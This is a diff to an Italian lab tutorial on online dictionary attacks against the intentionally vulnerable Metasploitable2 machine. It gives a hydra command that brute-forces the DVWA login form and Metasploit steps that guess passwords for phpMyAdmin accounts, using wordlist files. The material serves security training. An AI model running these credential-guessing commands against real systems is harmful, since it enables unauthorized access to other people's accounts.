@@ -147,11 +147,11 @@ Burp Suite ha intercettato la POST request. Potete vedere che ci sono 3 parametr
   ![image](burpsuite9.png)
 
  
-Aprite un terminale sulla macchina Kali e digitate il seguente comando
+Aprite un terminale sulla macchina Kali e digitate il seguente comando:
 ```
 hydra -V -l admin -P /usr/share/john/password.lst <INDIRIZZO IP METASPLOITABLE2) http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
 ```
-                   dove 
+   
 * L’opzione -V indica la modalità verbose dove ogni password provata verrà stampata a video
 * -l indica lo username di cui recuperare la password
 * -P indica il dizionario da utilizzare per recuperare la password
@@ -162,14 +162,30 @@ hydra -V -l admin -P /usr/share/john/password.lst <INDIRIZZO IP METASPLOITABLE2)
 
 # Attacchi online con Metasploit
 
-•Dobbiamo recuperare la password degli account root,  admin e user utilizzati per collegarsi alla applicazione myPhPAdmin sulla macchina Metasploitable2.
+Dobbiamo recuperare la password degli account root,  admin e user utilizzati per collegarsi alla applicazione myPhPAdmin sulla macchina Metasploitable2.
 
-Creaiamo il file /tmp/users.txt gli utenti di cui recuperare la password e il file /tmp/passwords.txt.
+Sulla macchina Kali Linux creaiamo il file /tmp/users.txt gli utenti di cui recuperare la password e il file /tmp/passwords.txt. Per creare i file, aprite un terminale e digitate i seguenti comandi:
+```
+# echo root >> /tmp/users.txt
+# echo admin >> /tmp/users.txt
+# echo user >> /tmp/users.txt
+# cat /tmp/users.txt
+```
 
-
-Facciamo partire la console di Metasploit  con il comando msfconsole e poi cerchiamo il modulo di Metasploit che implementa un online dictionary attack verso l’applicazione myPhPAdmin: 
-
-Selezioniamo l’opzione 1 e specifichiamo i vari parametri:
+Facciamo partire la console di Metasploit con il comando **msfconsole** e poi cerchiamo il modulo di Metasploit che implementa un attacco a dizionario  verso l’applicazione myPhPAdmin: 
+```
+# msfconsole
+# search phpMyAdmin
+```
+Selezioniamo l’opzione 1 e specifichiamo i seguenti parametri:
+```
+# show options
+# set RHOST <INDIRIZZO IP METASPLOITABLE2>
+# set TARGETURI /phpMyAdmin/index.php
+# set PASS_FILE /tmp/password.txt
+# set USER_FILE /tmp/users.txt
+# run
+```
  
-Dopo pochi secondi otterremo le password desiderate:
+Dopo pochi secondi otterremo le password desiderate!!
 
